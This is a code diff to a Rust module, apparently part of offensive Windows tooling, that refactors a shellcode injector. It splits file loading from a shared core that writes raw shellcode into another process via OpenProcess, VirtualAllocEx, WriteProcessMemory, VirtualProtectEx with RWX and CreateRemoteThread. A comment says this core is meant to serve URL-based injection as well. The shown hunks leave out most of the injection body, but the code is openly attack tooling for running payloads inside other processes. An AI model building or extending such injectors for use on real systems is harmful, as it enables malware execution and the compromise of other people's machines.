@@ -13,27 +13,16 @@ use windows::Win32::System::Threading::{
 
 use crate::error::MiscError;
 
-/// Inject raw shellcode into a target process using the classic technique.
+/// Inject raw shellcode bytes into a target process using the classic technique.
 ///
-/// Reads shellcode from a .bin file and injects it using:
 /// `OpenProcess` -> `VirtualAllocEx(RW)` -> `WriteProcessMemory` ->
 /// `VirtualProtectEx(RWX)` -> `CreateRemoteThread`
 ///
-/// # Arguments
-/// * `pid` - Target process ID
-/// * `shellcode_path` - Path to raw shellcode .bin file
-pub fn inject_shellcode_classic(pid: u32, shellcode_path: &str) -> Result<(), MiscError> {
-    let path = Path::new(shellcode_path);
-    if !path.exists() {
-        return Err(MiscError::FileNotFound(shellcode_path.to_string()));
-    }
-
-    let shellcode =
-        std::fs::read(path).map_err(|_| MiscError::FileReadFailed(shellcode_path.to_string()))?;
-
+/// This is the shared injection core used by both file-based and URL-based injection.
+pub(crate) fn inject_shellcode_bytes(pid: u32, shellcode: &[u8]) -> Result<(), MiscError> {
     if shellcode.is_empty() {
         return Err(MiscError::FileReadFailed(
-            "Shellcode file is empty".to_string(),
+            "Shellcode is empty".to_string(),
         ));
     }
 
@@ -119,4 +108,23 @@ pub fn inject_shellcode_classic(pid: u32, shellcode_path: &str) -> Result<(), Mi
 
         Ok(())
     }
+}
+
+/// Inject raw shellcode into a target process from a .bin file.
+///
+/// Reads shellcode from disk and injects using the classic technique.
+///
+/// # Arguments
+/// * `pid` - Target process ID
+/// * `shellcode_path` - Path to raw shellcode .bin file
+pub fn inject_shellcode_classic(pid: u32, shellcode_path: &str) -> Result<(), MiscError> {
+    let path = Path::new(shellcode_path);
+    if !path.exists() {
+        return Err(MiscError::FileNotFound(shellcode_path.to_string()));
+    }
+
+    let shellcode =
+        std::fs::read(path).map_err(|_| MiscError::FileReadFailed(shellcode_path.to_string()))?;
+
+    inject_shellcode_bytes(pid, &shellcode)
 }
